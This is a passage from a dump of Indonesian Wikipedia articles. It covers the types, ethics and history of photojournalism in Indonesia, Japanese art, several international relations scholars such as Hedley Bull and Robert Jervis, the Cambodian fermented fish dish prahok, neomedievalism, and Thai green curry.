Merupakan foto tentang orang atau masyarakat dalam suatu berita. Yang ditampilkan adalah sosok atau pribadi orang yang menjadi pokok berita tersebut. Tokoh dalam foto bisa merupakan tokoh penting atau populer, namun bisa juga tokoh yang tidak penting atau biasa saja, yang kemudian menjadi populer setelah foto tersebut dipublikasikan.


Merupakan foto yang menampilkan kehidupan sehari-hari manusia dipandang dari segi kemanusiawiannya ("human interest").


Merupakan foto yang menampilkan wajah seseorang secara "close up" dan “mejeng”. Ditampilkan karena terdapat kekhasan atau hal yang menarik pada wajah tersebut.


Merupakan foto yang diambil berdasarkan peristiwa olahraga. Ditujukan untuk menunjukkan gerakan dan ekspresi dari atlet dan hal lain yang menyangkut olahraga. Hal ini dikarenakan penonton tidak dapat melihat dengan jelas gerakan dan ekspresi dari atlet dengan jarak yang jauh.


Merupakan foto yang diambil dari peristiwa-peristiwa yang ada kaitannya dengan ilmu pengetahuan dan teknologi.


Merupakan foto yang diambil dari peristiwa seni dan budaya.


Merupakan foto yang menyangkut kehidupan sosial masyarakat serta lingkungan hidupnya

Di Indonesia, etika yang mengatur fotojurnalistik terdapat dalam Kode Etik Jurnalistik Wartawan Indonesia, khususnya pada Pasal 2 dan 3. Pada pasal 2 menyebutkan bahwa:

“Wartawan Indonesia dengan penuh rasa tanggung jawab dan bijaksana mempertimbangkan patut tidaknya menyiarkan karya jurnalistik (tulisan, suara, serta suara dan gambar) yang dapat membahayakan keselamatan dan keamanan negara, persatuan dan kesatuan bangsa, menyinggung perasaan agama, kepercayaan atau keyakinan suatu golongan yang dilindungi oleh Undang-Undang.”

Sedangkan pada pasal 3 menyebutkan mengenai cara pemberitaan dan menyatakan pendapat, yaitu sebagai berikut:

“Wartawan Indonesia pantang menyiarkan karya jurnalistik (tulisan, suara, serta suara dan gambar) yang menyesatkan memutar balikkan fakta, bersifat fitnah, cabul serta sensasional”.

Di Indonesia, Fotografi diperkirakan masuk pada tahun 1841 oleh Juriaan Munich, seorang utusan kementerian kolonial lewat jalan laut di Batavia. Setelah itu muncul seorang tokoh pribumi bernama Kassian Cephas yang dilansir sebagai fotografi pribumi pertama Indonesia dengan foto pertama yang diidentifikasi pada tahun 1875. Sejak abad ke-19, foto jurnalistik telah dikenal di tanah air melalui foto dokumenter sebagai akar dari foto jurnalistik. Pada masa penjajahan Belanda terdapat seorang juru foto bernama H.M. Neeb yang terkenal. Neeb berhasil menjadi fotografer dokumenter perang Aceh pada tahun 1904. Tanpa kehadiran Neeb, sejarah perang Aceh tidak bisa disaksikan dan kenang. Sejak itu foto jurnalistik semakin berkembang di Indonesia. Sejarah foto jurnalistik Indonesia bermuara dari kantor berita Domei, surat kabar Asia Raya dan agensi foto Indonesia Press Photo Service (IPPHOS) Fotografer bertugas untuk merekam situasi politik saat itu untuk kantor berita milik Jepang. Saat inilah pergerakan foto jurnalistik bermula. Pada tanggal 2 Oktober 1946, didirikan "Indonesia Press Photo Service" (IPPHOS).

Foto-foto yang dihasilkan oleh fotografer disana mengalami penerimaan. Terbukti dengan adanya sebuah foto fenomenal karya Frans Mendur dengan judul Imaji Proklamasi 17 Agustus 1945. Sebelum tahun 1980, seorang jurnalis fotografi sangat berat dalam mengerjakan tugasnya. Wartawan foto harus membawa seperangkat peralatan fotografi serta film jenis lembaran untuk menghasilkan reportase foto. Seiring berjalannya waktu, muncul kamera dengan ukuran 135mm dengan jenis gulungan film yang sedikit meringankan tugas seorang pewarta foto. Walau demikian, pewarta foto masih sulit untuk mengirimkan foto yang telah diambilnya. Setelah mengambil gambar, pewarta foto harus melakukan proses pencucian film agar gambar yang diambilnya dapat terlihat. Apabila, sang pewarta foto mengirim gulungan film kepada media cetak, pihak perusahaan pun juga tetap harus mencuci dan memilah film yang akan masuk untuk diterbitkan. Selain itu, dalam proses pengirimannya sendiri, seorang jurnalis fotografi harus pandai-pandai untuk menitipkan foto kepada penumpang pesawat atau bisa melalui jasa cargo. Cara lain dilakukan dengan saluran jasa telepon yang memakan waktu 20 menit, meskipun biaya yang dikeluarkan cenderung lebih mahal. Hal ini akan sangat memakan waktu, padahal dalam penyampaian berita, kecepatan menjadi hal yang paling utama.

Sekitar abad 21 keadaan berubah, dimana jurnalis dimanjakan dengan kamera digital ("digital camera"). Pengambilan gambar cenderung lebih mudah, pewarta foto pun tak perlu membawa perangkat yang berat-berat. Hanya dengan satu kamera, dapat mengambil gambar maupun video. Data digital yang telah ada tak perlu melakukan proses pencucian dan cetak terlebih dulu. Proses mengirimnya pun semakin mudah dan murah dengan adanya internet. Foto akan tiba hanya dalam hitungan menit.

Pewarta foto mengamati dan mengambil gambar sesuai dengan kejadian atau peristiwa pada saat itu, sehingga mereka harus fokus dan selalu siap untuk menangkap objeknya. Demikian, gambar akan menceritakan peristiwa yang sebenarnya terjadi serta dapat memantik respon emosional dari khalayak. Khalayak pun menjadi lebih tertarik dengan informasi-informasi yang dilengkapi dengan foto. Pasalnya, berita narasi memerlukan waktu yang lebih lama melalui proses membaca dan penalaran, sedangkan berita foto langsung mengundang respon dari khalayak. Meski demikian, keduanya akan saling melengkapi dalam proses penyajian berita sehingga penyampaian informasi akan semakin jelas. Hal ini yang menjadikan media cetak mensejajarkan antara wartawan tulis dan wartawan foto.

Kemajuan teknologi tidak sepenuhnya memberikan kemudahan yang bersifat positif. Rekan-rekan pewarta foto dapat mengubah gambar sesuai dengan keinginannya agar dapat terlihat bagus, indah, dan sebagainya hanya dengan menggunakan program Photoshop. Pewarta foto dapat mengurangi atau memberi tambahan objek pada foto. Hal ini tentu tidak dibenarkan, dianggap penipuan serta melanggar etika berita. Selain itu, hasil dari pengubahan foto akan menimbulkan pendapat yang berbeda antara benak masyarakat dan kejadian yang sebenarnya.

Perkembangan pewarta foto di Indonesia sendiri banyak menghasilkan generasi yang memperoleh penghargaan-penghargaan di dalam negeri hinggap mencapai kancah dunia. Meski banyak yang belajar dari otodidak, mereka terus tekun belajar dari buku dan jurnalis fotografi senior. Berikut beberapa nama pewarta foto yang namanya sudah melalang buana.





</doc>
<doc id="1753039" url="https://id.wikipedia.org/wiki?curid=1753039" title="Seni rupa Jepang">
Seni rupa Jepang

Seni rupa Jepang meliputi sejumlah besar gaya dan media seni, yakni tembikar kuno, ukiran, lukisan tinta dan kaligrafi di atas sutra dan kertas, lukisan "ukiyo-e" dan cetakan blok kayu, kiri-e, kirigami, origami, dan yang paling terkini manga—kartun dan komik Jepang modern—bersama dengan jenis lainnya dari karya seni rupa. Seni rupa Jepang memiliki sejarah yang panjang, bermula dari permulaan pemukiman manusia di Jepang, terkadang pada milenium ke-10 SM, sampai sekarang.




</doc>
<doc id="1753076" url="https://id.wikipedia.org/wiki?curid=1753076" title="Peter M. Haas">
Peter M. Haas

Peter M. Haas adalah dosen ilmu politik di Universitas Massachusetts Amherst dan Dosen Tamu Karl Deutsch di Wissenschaftszentrum Berlin.

Penelitiannya berkaitan dengan komunitas epistemik, politik lingkungan global, pemerintahan multitingkat, dna peran sains dalam politik global.

Haas mendapat gelar S1 dari Universitas Michigan dan Ph.D. dari Institut Teknologi Massachusetts pada tahun 1986. Ia sudah mengajar di Amherst sejak 1987, dan pernah menjadi dosen tamu di Universitas Yale, Universitas Brown, dan Universitas Oxford. Bapaknya, Ernst B. Haas, juga merupakan ilmuwan politik ternama.




</doc>
<doc id="1753077" url="https://id.wikipedia.org/wiki?curid=1753077" title="Susan Strange">
Susan Strange

Susan Strange (9 Juni 1923, Dorset – 25 Oktober 1998, Aylesbury, Buckinghamshire) adalah ilmuwan hubungan internasional Britania Raya yang "menciptakan sebagian besar bidang studi ekonomi politik internasional". Karya-karya Strange yang terkenal adalah "Casino Capitalism" (1986), "States and Markets" (1988), "The Retreat of the State" (1996), dan "Mad Money" (1998).





</doc>
<doc id="1753078" url="https://id.wikipedia.org/wiki?curid=1753078" title="Jennifer Sterling-Folker">
Jennifer Sterling-Folker

Jennifer Sterling-Folker adalah dosen Departemen Ilmu Politik Universitas Connecticut. Ia merupakan peneliti teori hubungan internasional.

Ia mendapatkan gelar M.A. dan Ph.D. di bidang ilmu politik dari Universitas Chicago, dan B.A. di bidang ilmu politik dan sejarah seni dari Universitas New Hampshire.

Sterling-Folker dan Mark Boyer menjabat sebagai penyunting "International Studies Review", sebuah jurnal milik International Studies Association. Ia bersama Kimberly Hutchings, George Lawson, dan Mathias Albert juga menjadi penyunting "Review of International Studies", jurnal milik British International Studies Association.

Melalui karya-karyanya, Sterling-Folker menjelaskan perbedaan antara berbagai aliran teori hubungan internasional seperti konstruktivisme dengan neoliberalisme (atau institusionalisme liberal), dan konstruktivisme dengan realisme. Ia juga memimpin usaha penerapan teori hubungan internasional dalam konflik Kosovo.





</doc>
<doc id="1753079" url="https://id.wikipedia.org/wiki?curid=1753079" title="Robert J. Art">
Robert J. Art

Robert Jeffrey Art adalah Dosen Hubungan Internasional Christian A. Herter di Universitas Brandeis dan anggota MIT Center for International Studies.
Ia meneliti teori neorealisme yang berpendapat bahwa militer masih menjadi dasar struktur kekuasaan di dunia modern. Ia adalah anggota Council on Foreign Relations.

Ia pernah mendapat penghargaan dari Center for International Affairs at Harvard University, Council on Foreign Relations (International Affairs Fellow), Guggenheim Foundation, Ford Foundation, United States Institute of Peace, dan Century Foundation.




</doc>
<doc id="1753080" url="https://id.wikipedia.org/wiki?curid=1753080" title="Robert Jervis">
Robert Jervis

Robert Jervis (lahir 1940) adalah Dosen Hubungan Internasional Adlai E. Stevenson di Universitas Columbia sejak 1980. Jervis merupakan pemenang Grawemeyer Award for Ideas Improving World Order yang dipersemabahkan oleh Universitas Louisville pada tahun 1990. Jervis menjabat sebagai penyunting "Cornell Studies in Security Affairs", rangkaian jurnal terbitan Cornell University Press, dan anggota dewan peninjau redaksi untuk beberapa jurnal ilmiah.





</doc>
<doc id="1753082" url="https://id.wikipedia.org/wiki?curid=1753082" title="William Wohlforth">
William Wohlforth

William Curti Wohlforth (lahir 1959) adalah Dosen Pemerintaan Daniel Webster di Departemen Pemerintahan Dartmouth College. Ia menjabat sebagai ketua departemen selama tiga tahun (2006-2009). Ia merupakan penulis "Elusive Balance: Power and Perceptions during the Cold War" (Cornell, 1993) serta penyunting "Witnesses to the End of the Cold War" (Johns Hopkins, 1996) dan "Cold War Endgame: Oral History, Analysis, and Debates" (Penn State, 2003). Pada tahun 1999, Wohlforth menerbitkan sebuah artikel yang mempertanyakan pengetahuan masyarakat waktu itu bahwa supremasi Amerika Serikat pasca-Perang Dingin tidak akan bertahan lama.

Ia merupakan peneliti beraliran realisme neoklasik dan dikenal atas tulisan-tulisannya mengenai unipolaritas Amerika Serikat yang digarap bersama Stephen Brooks. Mereka telah menerbitkan beberapa artikel dan sebuah buku berjudul "World Out of Balance: International Relations Theory and the Challenge of American Primacy".
Wohlforth pernah menjadi pemimpin redaksi "Security Studies" pada tahun 2008 sampai 2011.

Wohlforth mendapat gelar Bachelor di bidang hubungan internasional (summa cum laude) dari Beloit College. Ia kemudian mendapatkan gelar Master dan PhD di bidang hubungan internasional dari Universitas Yale.



</doc>
<doc id="1753083" url="https://id.wikipedia.org/wiki?curid=1753083" title="Randall Schweller">
Randall Schweller

Randall L. Schweller adalah dosen ilmu politik di Universitas Negeri Ohio. Ia sudah mengajar di sana sejak tahun 1994.

Schweller mendapatkan gelar PhD dari Universitas Columbia pada tahun 1993 dan merupakan anggota Olin Fellow di Universitas Harvard pada tahun 1993-94. Bidang ajar dan penelitiannya adalah keamanan internasional dan teori hubungan internasional. Ia dikenal atas teori keseimbangan kepentingan, bentuk lain dari teori keseimbangan kekuasaan Kenneth Waltz dan teori keseimbangan ancaman Stephen Walt. Karya-karyanya mengenai teori tersebut adalah "Tripolarity and the Second World War" di "International Studies Quarterly" (Maret 1993) dan "Deadly Imbalances: Tripolarity and Hitler's Strategy of World Conquest" (Columbia University Press, 1998).

Schweller sering dikaitkan dengan tokoh realis struktural seperti Kenneth Waltz dan Stephan Walt. Ia lebih pantas dikelompokkan sebagai realis neoklasik (istilah ciptaan Gideon Rose) karena mau mempertimbangkan teori perilaku negara non-struktural. Realis neoklasik lainnya meliputi Fareed Zakaria, Thomas J. Christensen, dan William Wohlforth).

Ia juga menegaskan kembali perbedaan antara negara status quo dengan negara revisionis, dan memasukkan perbedaan tersebut ke teori perilaku negara realis.

Tulisan-tulisannya menjelaskan mengapa negara kadang gagal menyeimbangkan diri sambil berfokus pada dinamika internalnya yang berlawanan dengan asumsi aktor tunggal realisme struktural. Ia telah menulis sebuah buku mengenai hal ini yang merupakan kelanjutan dari salah satu artikelnya. Buku tersebut diterbitkan oleh Princeton University Press.



</doc>
<doc id="1753085" url="https://id.wikipedia.org/wiki?curid=1753085" title="Aaron Friedberg">
Aaron Friedberg

Aaron Louis Friedberg (lahir 16 April 1956) adalah wakil asisten keamanan nasional dan direktur perumusan kebijakan untuk Wakil Presiden Amerika Serikat sejak tahun 2003 sampai 2005.

Setelah mendapatkan gelar PhD di bidang pemerintahan dari Universitas Harvard, Friedburg menjadi dosen di Universitas Princeton pada tahun 1987 dan diangkat sebagai dosen politik dan hubungan internasional pada tahun 1999. Ia pernah menjabat sebagai direktur program penelitian keamanan internasional di Woodrow Wilson School, Princeton, dan direktur sementara Center of International Studies di Princeton. Friedberg merupakan mantan anggota Woodrow Wilson International Center for Scholars (Smithsonian Institution), Norwegian Nobel Institute, dan Center for International Affairs (Universitas Harvard). Ia juga menjabat sebagai ketua dewan penasihat di Pyle Center for Northeast Asian Studies di National Bureau of Asian Research.

Pada September 2001, Friedberg menjalani masa jabatannya sebagai Akademisi Henry Alfred Kissinger pertama di Library of Congress selama sembilan bulan. Di sana ia meneliti kebangkitan Asia dan dampaknya bagi Amerika Serikat. Selain artikel di majalah "Commentary", Friedberg telah menulis beberapa buku tentang hubungan luar negeri.

Ia merupakan salah satu penandatangan "Statement of Principles" dari Project for the New American Century (PNAC, 3 Juni 1997) dan surat tentang terorisme yang dikirimkan ke Presiden George W. Bush (20 September 2001). Namanya sering dikaitkan dengan Aspen Strategy Group di Aspen Institute.

Friedberg mewakili Mitt Romney selaku penasihat keamanan nasional kampanye kepresidenannya dalam debat kebijakan A.S. di Cina pada bulan Oktober 2012.

Meski pemikiran hubungan internasional Friedberg muncul dari ketertarikannya terhadap organisasi kekuasaan struktural yang menjadi ciri khas aliran realis, ia dipengaruhi oleh tradisi institusionalisme liberal sehingga menghasilkan sesuatu yang Thomas Christensen sebut sebagai "sikap [hubungan internasional] yang positif". Tak seperti ilmuwan realisme pesimistis lainnya, Friedberg, dalam artikel di "International Security" tahun 1993, mendukung keterlibatan Amerika Serikat di Asia Timur sebagai pasukan penyeimbang sampai integrasi ekonomi kawasan dan lembaga multilateral dapat berkembang di sana. Berbeda dengan ilmuwan realpolitik tradisional, Friedberg percaya bahwa konflik di Asia Timur tak dapat dielakkan lagi karena Cina terus berkembang selama lembaga multilateral dan integrasi ekonomi dimanfaatkan sebagai alat untuk menangani dilema keamanan.




</doc>
<doc id="1753090" url="https://id.wikipedia.org/wiki?curid=1753090" title="Hedley Bull">
Hedley Bull

Hedley Bull, FBA (10 Juni 1932 – 18 Mei 1985) adalah dosen hubungan internasional di Universitas Nasional Australia, London School of Economics, dan Universitas Oxford. Ia juga merupakan Montague Burton Professor of International Relations di Oxford pada tahun 1977 sampai 1985. Ia meninggal dunia tahun 1985 di Oxford akibat kanker.

Bull lahir di Sydney, Australia, dan mengenyam pendidikan di Fort Street High School. Ia belajar sejarah dan filsafat di Universitas Sydney. Di sana ia dipengaruhi oleh filsuf John Anderson. Tahun 1953, Bull meninggalkan Australia untuk belajar politik di Universitas Oxford. Dua tahun kemudian, ia diangkat menjadi dosen pembantu hubungan internasional di London School of Economics and Political Science (LSE).

Tahun 1965, Bull ditunjuk sebagai direktur Arms Control and Disarmament Unit di British Foreign Office. Dua tahun kemudian, ia diangkat menjadi dosen hubungan internasional di Universitas Nasional Australia di Canberra.

Pada tahun 1977, Bull menerbitkan karya terbesarnya yang berjudul "The Anarchical Society". Buku ini dijadikan buku acuan utama di bidang hubungan internasional dan menjadi sumber utama mazhab Inggris dalam hubungan internasional. Di buku ini, Bull berpendapat bahwa meski dunia internasional bersifat anarkis, dunia tidak hanya mengalami pembentukan sistem negara, tetapi juga perkumpulan negara. Menurutnya, syarat agar suatu entitas bisa disebut negara adalah entitas tersebut harus mengklaim kedaulatan atas sekelompok orang dan wilayah yang jelas, dan memiliki pemerintahan. Negara baru membentuk sebuah sistem setelah memiliki interaksi yang cukup dan turut memengaruhi keputusan negara lain sehingga mereka "setidaknya beroperasi sebagai bagian dari satu keutuhan." Sistem negara dapat dibangun tanpa perlu menjadi perkumpulan negara. Perkumpulan negara terbentuk "ketika beberapa negara yang memiliki kepentingan dan nilai yang sama membentuk perkumpulan yang anggota-anggotanya terikat oleh serangkaian aturan yang mengatur hubungan antaranggota dan berbagi tugas dalam suatu lembaga."

Perkumpulan negara adalah cara Bull menganalisis dan menilai kemungkinan tatanan dalam politik dunia. Ia melanjutkan pendapatnya dengan memaparkan konsep tatanan dalam kehidupan sosial, dan mekanisme keseimbangan kekuasaan, hukum internasional, diplomasi, perang, dan peran utama negara adidaya. Ia menyimpulkan bahwa walaupun ada jenis-jenis organisasi alternatif, sistem negara adalah kesempatan terbaik umat manusia untuk menciptakan tatanan dalam politik dunia.



Daftar pustaka Hedley Bull yang lengkap (disusun Donald Markwell) dapat ditemukan di:



</doc>
<doc id="1753091" url="https://id.wikipedia.org/wiki?curid=1753091" title="Prahok">
Prahok

Prahok (ប្រហុក) adalah hidangan khas Kamboja berupa daging ikan cincang (biasanya ikan gabus) yang digarami, difermentasi, dan dibungkus daun pisang. Prahok dapat dijadikan lauk-pauk, atau sebagai bumbu penyedap masakan mirip terasi. Prahok merupakan salah satu metode pengawetan pangan saat Kamboja memasuki bulan-bulan musim kemarau, ketika ikan segar langka. Prahok biasanya dimakan sebagai lauk utama, disajikan dengan nasi putih serta sayuran seperti kacang panjang, mentimun, dan terong.

Karena rasanya yang asin dan kuat, prahok lazim dijadikan sebagai bumbu penyedap rasa dalam masakan Kamboja, seperti ditambahkan dalam sup atau saus. Ungkapan Kamboja yang berbunyi, "tanpa prahok, tanpa garam", mengacu kepada masakan yang tawar, tidak memiliki citarasa, atau "cemplang", sekaligus menunjukkan betapa pentingnya peran prahok dalam seni kuliner Kamboja. Karena dibuat dengan proses fermentasi, prahok memiliki aroma yang kuat, menyengat, dan kurang sedap, mirip bau terasi di Indonesia. Ungkapan Kamboja; "mulut prahok", merujuk kepada seseorang yang gemar berbicara kotor (jorok), hal ini merujuk kepada prahok yang memang berbau tidak sedap.

Karena mudah disimpan dan cukup awet, prahok matang biasanya menjadi makanan ransum sumbangan untuk korban bencana alam seperti banjir atau kekeringan. Prahok dapat dimasak dengan cara dibakar, dikukus, direbus, atau digoreng. Prahok jarang sekali disajikan mentah-mentah karena alasan kesehatan dan higienis — memasak prahok berarti turut membunuh mikroba berbahaya yang mungkin tumbuh dan hidup di dalam prahok. Selain itu, prahok mentah tidak tahan lama, mudah busuk, dan aromanya kurang sedap.

Prahok dibuat dengan cara fermentasi ikan cincang. Jenis ikan yang digunakan biasanya ikan air tawar seperti ikan gabus ("Channa" spp.) dan gurami ("Trichogaster microlepis"). Salah satu jenis prahok yang khas menggunakan ikan gurami disebut "Prahok Kanthara" dan disajikan di Laos.

Prahok dibuat dengan cara mencincang, melumat, dan menghancurkan daging ikan segar, setelah sebelumnya sisiknya dibersihkan dan isi perutnya dibuang. Cara tradisonal di Kamboja adalah dengan cara diinjak-injak, akan tetapi kini kebanyakan menggunakan mesin penggiling. Setelah lumat, daging ikan dijemur seharian, kemudian digarami. Prahok mengalami proses fermentasi dalam tempayan tembikar yang ditutupi anyaman bambu. Setelah 3 pekan atau 20 hari, proses fermentasi dapat dianggap selesai, dan prahok dapat dikonsumsi dengan cara dimasak terlebih dahulu. Akan tetapi prahok kualitas prima biasanya mengalami proses fermentasi yang lebih lama, bisa mencapai bulanan bahkan tahunan.

"Prahok chien " (ប្រហុកជៀន) Biasanya dicampur daging (sapi atau babi) dan cabai merah, lalu digoreng atau ditumis dalam minyak kelapa panas. Dapat juga dijadikan sebagai semacam sambal cocol untuk sayuran mirip lalab, seperti mentimun, terong, dan nasi.

"Prahok gop" atau "Prahok ang" (ប្រហុកកប់) atau (ប្រហុកអាំង) Sejenis prahok yang dibungkus daun pisang, biasanya dimasak dengan cara dijepit di bawah batu panas yang dibakar, atau dipanggang di atas tungku kayu bakar.

"Prahok chao" (ប្រហុកឆៅ) Prahok mentah dicampur sereh, air perasan limau, cabai merah, dan terong sayur, disajikan sebagai saus hidangan daging sapi. Saus ini juga dapat disajikan sebagai saus cocolan sayur dan buah-buahan.




</doc>
<doc id="1753092" url="https://id.wikipedia.org/wiki?curid=1753092" title="Gideon Rose">
Gideon Rose

Gideon Rose adalah penyunting "Foreign Affairs" dan anggota Council on Foreign Relations. Ia menjabat sebagai Asisten Direktur Urusan Timur Dekat dan Asia Selatan di Dewan Keamanan Nasional sejak tahun 1994 sampai 1995 di bawah pemerintahan Clinton.





</doc>
<doc id="1753096" url="https://id.wikipedia.org/wiki?curid=1753096" title="Medievalisme baru">
Medievalisme baru

Medievalisme baru (atau neo-medievalisme) adalah istilah lama yang mengandung makna teknis dalam dua bidang keilmuan. Dalam teori politik (hubungan internasional modern), Hedley Bull menafsirkan neo-medievalisme sebagai pandangan bahwa tatanan politik dunia global serupa dengan Eropa pada puncak abad pertengahan, ketika tidak satupun negara, agama, atau penguasa wilayah yang memegang kedaulatan penuh; semuanya berinteraksi dalam sistem multikedaulatan yang kompleks, bertindihan, dan tidak sempurna. Dalam teori sastra, istilah ini bermakna penggunaan dan penyalahgunaan teks dan klise Abad Pertengahan dalam pascamodernitas; makna istilah ini dipaparkan oleh Umberto Eco dalam esai berjudul "Dreaming of the Middle Ages" (1986).

Neomedievalisme dalam teori politik pertama kali digagas oleh teoriwan Hedley Bull dalam buku "The Anarchical Society: A Study of Order in World Politics" (1977) untuk menjelaskan terkikisnya kedaulatan negara dalam dunia modern yang terglobalisasi:Negara berdaulat bisa saja hilang dan digantikan bukan oleh pemerintahan dunia, melainkan pemerintahan modern dan sekuler seperti organisasi politik universal yang berdiri di dunia Kristen Barat pada Abad Pertengahan. Dalam sistem tersebut, tidak satupun penguasa atau negara memegang kedaulatan dalam artian berkuasa atas wilayah dan penduduk Kristen tertentu; masing-masing dari mereka harus berbagi kedaulatan dengan vazal-vazal di bawahnya dan dipimpin oleh Paus dan Kaisar Romawi Suci (di Jerman dan Italia). Tatanan politik universal dunia Kristen Barat merupakan alternatif bagi sistem negara yang belum menyerupai pemerintahan universal.Bull mengatakan bahwa masyarakat bisa saja beralih menuju "medievalisme baru" atau "tatanan politik universal neo-medieval", tempat terkikisnya kedaulatan bangsa oleh hak-hak individu dan paham "kemaslahatan bersama global". Ia memperkirakan bahwa sistem ini dapat "menghindari ancaman-ancaman yang menjadi ciri khas sistem negara berdaulat melalui struktur dan aliansi tumpang-tindih yang menyatukan semua bangsa dalam masyarakat universal sekaligus menghindari pemusatan kekuasaan dalam pemerintahan dunia", tetapi "apabila wujudnya sama seperti Kristen Barat, sistem ini akan menghasilkan kekerasan dan kekacauan berkelanjutan dalam jumlah besar daripada sistem negara yang ada saat ini".

Menurutnya, globalisasi menghasilkan sistem internasional yang menyerupai sistem abad pertengahan, ketika kewenangan politik dijalankan oleh berbagai pihak yang saling bertindihan seperti lembaga agama, kepangeranan, imperium, dan negara-kota, bukan penguasa politik tunggal berbentuk negara yang memegang kedaulatan penuh atas wilayahnya. Proses lain yang mencerminkan "medievalisme baru" adalah bertambahnya kekuasaan organisasi-organisasi regional seperti Uni Eropa serta maraknya devolusi atau otonomi pemerintahan subnasional seperti Skotlandia dan Katalunya. Proses-proses ini mengancam kewenangan eksklusif yang dimiliki negara. Perusahaan militer swasta, perusahaan multinasional, dan kebangkitan aliran agama global (misalnya Islamisme) menunjukkan bahwa peran negara semakin menyusut dan kekuasaan sekaligus kewenangan semakin tidak terpusat (desentralisasi).

Pada tahun 1998, Stephen J. Kobrin menambahkan ekonomi dunia digital ke dalam konsep neomedievalisme. Dalam artikel berjudul "Back to the Future: Neomedievalism and the Postmodern Digital World Economy" di "Journal of International Affairs", ia berpendapat bahwa negara berdaulat pada umumnyaditandai oleh perbatasan wilayah tertentuakan berubah drastis atau bahkan lenyap. Salah satu penyebabnya adalah ekonomi dunia digital yang tercipta berkat Internet. Ia menulis bahwa ruang siber adalah ranah transwilayah yang berada di luar wilayah hukum (yurisdiksi) negara.

Anthony Clark Arend juga menulis dalam buku berjudul "Legal Rules and International Society" (1999) bahwa sistem internasional sedang bergerak ke arah sistem "neo-medieval". Ia mengklaim bahwa proses yang disorot Bull tahun 1977 semakin nyata pada akhir abad ke-20. Arend berpendapat bahwa munculnya sistem "neo-medieval" akan berdampak besar bagi perumusan dan pelaksanaan hukum internasional.

Meski Bull awalnya membayangkan neomedievalisme sebagai proses yang positif, konsep ini juga menuai kritik. Dalam "Neomedievalism, Neoconservatism, and the War on Terror", Bruce Holsinger menulis bahwa kaum neokonservatif "memanfaatkan keluwesan konsep neomedievalisme untuk keuntungan taktisnya sendiri." Dalam "Neomedievalism, Civil War and the New Security Dilemma" (1998), Philip G. Cerny juga memandang neomedievalisme sebagai proses negatif dan mengklaim bahwa desakan globalisasi pelan-pelan melemahkan negara-bangsa dan tata kelola antarnegara "dengan mengabaikan keterkaitan antara sektor ekonomi dan ikatan sosial". Ia menyebut globalisasi sebagai "gangguan tak terhentikan" yang akan menciptakan dilema keamanan baru seperti pada Abad Pertengahan. Cerny mengidentifikasi enam ciri-ciri dunia neomedieval yang memicu "gangguan" ini: banyak lembaga yang bersaing; tidak ada tekanan penguasaan wilayah dari luar di tingkat subnasional dan internasional; ketidaksetaraan konsolidasi ruang, celah, konflik, dan kesenjangan baru; pencabutan hak-hak properti; dan persebaran pasar gelap "zona abu-abu" di luar hukum.

Makna neo-medievalisme yang dipaparkan Umberto Eco pertama kali digunakan dalam "The Hedgehog and the Fox" karya Isaiah Berlin tahun 1953: Tidak ada keterkaitan antara dia [Joseph de Maistre] dan mereka yang benar-benar yakin bahwa masa lalu mungkin akan terwujud kembali kalangan neo-medievalis mulai dari Wackenroder dan Görres dan Cobbett sampai G. K. Chesterton, dan kaum Slavofil dan Distributis dan Pra-Raffaellit dan orang-orang romantis nostalgis lainnya; karena dia meyakini sebaliknya seperti Tolstoy: yakin dengan kekuatan masa kini yang "tak terbendung": yakin dengan ketidakmampuan kita untuk merombak semua kondisi yang menentukan kategori dasar kita, sebuah tatanan yang tidak akan pernah bisa kita jabarkan atau ketahui kecuali dengan menyadarinya secara langsung. Pada tahun 1986, Umberto Eco mengatakan bahwa "saat ini kita melihat bangkitnya ketertarikan terhadap Abad Pertengahan di Eropa dan Amerika disertai pergeseran antara neomedievalisme fantasi dan pendalaman filologi secara ilmiah". Belakangan ini, konsep ini diangkat oleh berbagai kalangan seperti sejarawan abad pertengahan yang memandang neomedievalisme sebagai percampuran fantasi populer dengan sejarah abad pertengahan sekaligus istilah yang menjelaskan kajian pascamodern terhadap sejarah abad pertengahan.

Gelombang ketertarikan masyarakat terhadap tema-tema abad pertengahan dalam budaya populer, khususnya permainan komputer seperti MMORPG, film dan televisi, musik neo-medieval, dan sastra populer, disebut gelombang "neomedieval". Kritikus menyoroti penyebab abad pertengahan menjadi daya tarik bagi masyarakat modern yang semakin canggih. Salah satu penyebab yang dikemukakan adalah kebutuhan romantisasi narasi sejarah untuk menjelaskan berbagai peristiwa politik dan budaya modern yang membingungkan.

Para akademisi terus mendalami dan mengembangkan neomedievalisme. Di antara karya-karya mereka adalah makalah Carol L. Robinson dan Pamela Clements tahun 2009 berjudul “Living with Neomedievalism” di jurnal "Studies in Medievalism", antologi Robinson dan Clements berjudul "The Medieval in Motion: Neomedievalism in Film, Television and Electronic Games", kumpulan makalah MEMS (Medieval Electronic Multimedia Organization), jurnal ilmiah "Studies in Medievalism: Defining Neomedievalism(s)", diskusi panel bertajuk “Neomedievalist Communities” and “Gaming Neomedievally” di Kongres Kajian Abad Pertengahan Internasional 2009 di Kalamazoo, Michigan, dan topik "Neomedievalisms" dalam Konferensi Medievalisme Internasional ke-22 tahun 2007.




</doc>
<doc id="1753097" url="https://id.wikipedia.org/wiki?curid=1753097" title="Anthony Clark Arend">
Anthony Clark Arend

Anthony Clark Arend (lahir 24 Oktober 1958) adalah dosen pemerintahan dan dinas luar negeri di Universitas Georgetown. Pada tanggal 1 Juli 2008, ia menjadi direktur program Master of Science in Foreign Service di Walsh School of Foreign Service, Universitas Georgetown. Bersama Christopher C. Joyner, ia mendirikan Institute for International Law and Politics (sekarang bernama Institute for Law, Science and Global Security) di Georgetown dan menjabat sebagai direkturnya pada tahun 2003-2008. Ia juga merupakan dosen tamu hukum di Georgetown University Law Center. Pada tahun 2005-2009, ia menyunting blog "Exploring International Law". Blognya sekarang dapat diakses di "AnthonyClarkArend.com" Arend merupakan anggota Council on Foreign Relations.

Arend merupakan penulis dan penyunting beberapa buku, termasuk:



</doc>
<doc id="1753099" url="https://id.wikipedia.org/wiki?curid=1753099" title="Kaeng khiao wan">
Kaeng khiao wan

Kaeng khiao wan atau kari hijau (, , , secara harfiah "kari hijau manis") adalah sejenis hidangan kari berwarna hijau yang berasal dari Thailand Tengah.

